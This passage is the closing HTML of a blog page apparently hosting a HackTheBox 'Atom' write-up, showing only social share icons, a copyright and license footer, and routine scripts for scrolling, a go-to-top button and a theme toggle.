512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Atom on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fatom%2f&title=HackTheBox%20-%20Atom&summary=HackTheBox%20-%20Atom&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fatom%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Atom on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fatom%2f&title=HackTheBox%20-%20Atom"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Atom on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fatom%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Atom on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Atom%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fatom%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Atom on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Atom&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fatom%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;Â·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>